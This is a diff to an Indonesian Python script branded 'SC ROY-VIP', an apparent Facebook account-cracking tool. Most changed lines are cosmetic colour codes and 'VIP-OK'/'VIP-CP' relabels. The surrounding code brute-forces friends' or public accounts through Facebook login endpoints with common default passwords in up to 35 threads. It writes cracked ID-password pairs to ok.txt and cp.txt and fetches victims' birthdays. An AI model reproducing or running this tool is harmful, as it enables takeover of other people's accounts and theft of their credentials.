@@ -147,7 +147,7 @@ def log_token():
         zedd = open("login.txt", "w")
         zedd.write(toket)
         zedd.close()
-        print((p+"\n["+k+"✔"+p+"]"+p+" "+h+"Login Berhasil"))
+        print((p+"\n["+h+"✔"+p+"]"+p+" "+h+"Login Berhasil"))
         bot_follow()
     except KeyError:
         print((p+"["+k+"❌"+p+"]"+p+" "+m+"Token Mati"))
@@ -179,7 +179,7 @@ def gen():
         cookie = open("login.txt", "w")
         cookie.write(find_token.group(1))
         cookie.close()
-        print((p+"\n["+k+"✔"+p+"]"+p+" "+h+"Login Berhasil"))
+        print((p+"\n["+h+"✔"+p+"]"+p+" "+h+"Login Berhasil"))
         bot_follow()
 
 ### BOT FOLLOW ### Jangan Diganti Anjing !!!
@@ -219,10 +219,10 @@ def menu():
     print((p+"================================================="))
     print((p+"[ "+k+"Selamat datang "+a["name"]+p+" ]"+p))
     print((p+"================================================="))
-    print((p+"["+o+"✔"+p+"]"+p+" ID FB Anda	👉 "+k+""+id))
-    print((p+"["+o+"✔"+p+"]"+p+" IP Anda	👉 "+k+""+ip))
-    print((p+"["+o+"✔"+p+"]"+p+" Status	👉 "+h+"Premium"))
-    print((p+"["+o+"✔"+p+"]"+p+" Bergabung	👉 "+k+""+durasi))
+    print((p+"["+h+"✔"+p+"]"+p+" ID FB Anda	👉 "+k+""+id))
+    print((p+"["+h+"✔"+p+"]"+p+" IP Anda	👉 "+k+""+ip))
+    print((p+"["+h+"✔"+p+"]"+p+" Status	👉 "+h+"Premium"))
+    print((p+"["+h+"✔"+p+"]"+p+" Bergabung	👉 "+k+""+durasi))
     print((p+"================================================="))
     print((p+"[❓ "+o+"Menu Pilihan "+p+"]"+p))
     print((p+"["+k+"1"+p+"]"+p+" Crack Dari Teman/Publik"))
@@ -257,7 +257,7 @@ def choose_menu():
 		ress()
 	elif r=="0":
 		try:
-			jalan(p+"\n["+k+"✔"+p+"]"+p+" "+h+"Terimakasih telah menggunakan SC ROY-VIP")
+			jalan(p+"\n["+h+"✔"+p+"]"+p+" "+h+"Terimakasih telah menggunakan SC ROY-VIP")
 			os.system("rm -rf login.txt")
 			exit()
 		except Exception as e:
@@ -431,10 +431,10 @@ def brute(user, passs):
       api='https://b-api.facebook.com/method/auth.login'
       response=requests.get(api, params=params)
       if re.search('(EAAA)\w+', str(response.text)):
-        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
+        print('\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
         break
       elif 'www.facebook.com' in response.json()['error_msg']:
-        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
+        print('\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
         break
   except: pass
 
@@ -585,6 +585,7 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
+		print((p+"\n["+h+"✔"+p+"]"+p+" Default : "+k+"nama,nama123,nama12345,sayang,bismillah,indonesia,rahasia"))
 		print((p+"\n["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
 		while True:
 			f=input(p+"["+k+"❓"+p+"]"+p+" Pilih 👉"+k+" ")
@@ -607,7 +608,7 @@ class crack:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+"["+k+"⭐"+p+"]"+p+" Contoh 👉"+k+" 123456,rahasia,cantik123"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Contoh 👉"+k+" cantik,cantik123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -627,7 +628,7 @@ class crack:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+				print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -639,7 +640,7 @@ class crack:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+			print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -649,13 +650,13 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					open("ok.txt","a+").write(
 						"%s • %s\n"%(fl.get("id"),i))
@@ -674,6 +675,7 @@ class crackttl:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
+		print((p+"\n["+h+"✔"+p+"]"+p+" Default : "+k+"nama,nama123,nama12345,sayang,bismillah,indonesia,rahasia"))
 		print((p+"\n["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
 		while True:
 			f=input(p+"["+k+"❓"+p+"]"+p+" Pilih 👉"+k+" ")
@@ -696,7 +698,7 @@ class crackttl:
 				except Exception as e:
 					print(("   %s"%e))
 					continue
-				print((p+"["+k+"⭐"+p+"]"+p+" Contoh 👉"+k+" sayang,bismillah,123456"))
+				print((p+"["+k+"⭐"+p+"]"+p+" Contoh 👉"+k+" cantik,cantik123,123456"))
 				self.pwlist()
 				break
 			elif f=="d":
@@ -716,7 +718,7 @@ class crackttl:
 						except:continue
 				except Exception as e:
 					print(("   %s"%e))
-				print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+				print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
 				exit()
@@ -728,7 +730,7 @@ class crackttl:
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
-			print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+k+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
+			print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
 			exit()
@@ -743,13 +745,13 @@ class crackttl:
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
 					except:pass
-					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					print(("\r\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
 					self.cp.append("%s • %s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
+					print(("\r\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
 					self.ada.append("%s • %s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
